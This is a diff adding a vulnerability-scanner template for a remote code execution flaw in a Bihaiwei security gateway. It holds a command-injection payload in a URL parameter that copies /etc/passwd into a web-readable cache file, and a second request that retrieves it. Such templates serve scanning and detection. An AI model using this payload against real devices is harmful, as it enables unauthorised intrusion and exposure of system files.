@@ -1,0 +1,23 @@
+id: bihaiwei-rce-2
+
+info:
+  name: 碧海威高性能智能应用安全网关远程代码执行之一
+  author: str1am
+  severity: high
+  tags: bihaiwei,rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/notice/confirm.php?t=;cp+/etc/passwd+/www/report/cache/1a2.txt||echo&u=hello"
+      - "{{BaseURL}}/report/cache/1a2.txt"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root:x"
+
+      - type: status
+        status:
+          - 200
